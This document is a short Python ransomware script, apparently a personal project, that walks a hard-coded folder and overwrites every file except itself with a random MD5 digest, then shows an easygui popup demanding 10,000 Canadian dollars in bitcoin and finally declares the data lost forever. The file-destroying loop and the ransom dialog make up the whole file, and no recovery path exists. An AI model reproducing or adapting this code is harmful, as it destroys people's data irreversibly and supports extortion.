import hashlib
import os
import random
from easygui import *

path = r"C:\Users\sakth\OneDrive\Desktop\python projects\Compleated viruses\Ransomware\Important"

file = os.walk(path, topdown=False)

def hash(filetohash):
	z = open(filetohash, "w")
	hash = [hashlib.md5(b"and"), hashlib.md5(b"bytes"), hashlib.md5(b"hello"), hashlib.md5(b"bye"), hashlib.md5(b"dude"), hashlib.md5(b"hahaha"), hashlib.md5(b"a"), hashlib.md5(b"b")]
	hash = random.choice(hash)
	hash = hash.hexdigest()
	z.write(hash)
	z.close()

for root, directories, files in file:
	for name in files:
		#print(os.path.join(root, name))
		if os.path.join(name) == "ransomware.py":
			print("yes")
		else:
			hash(os.path.join(root, name))
	for name in directories:
		os.path.join(root, name)

def main():
	text = "Your will pay 10,000 Canadian dollars to this bitcoin address to get a decryption key: "
	title = "Oops! Your files are encrypted!"
	output = enterbox(text, title, )
	output = hashlib.md5(output.encode("utf-8"))
	output = output.hexdigest()
	if output == "5063291ef2e058ea19e931f5d4ec24f5":
		message = "Your files have been encrypted with the MD5 algorithem which is irrevesable! Have fun with your encrypted data!"
		title = "Oops! Your data is lost forever!"
		ok_btn_txt = "Give up"
		output = msgbox(message, title, ok_btn_txt)
	else:
		main()
main()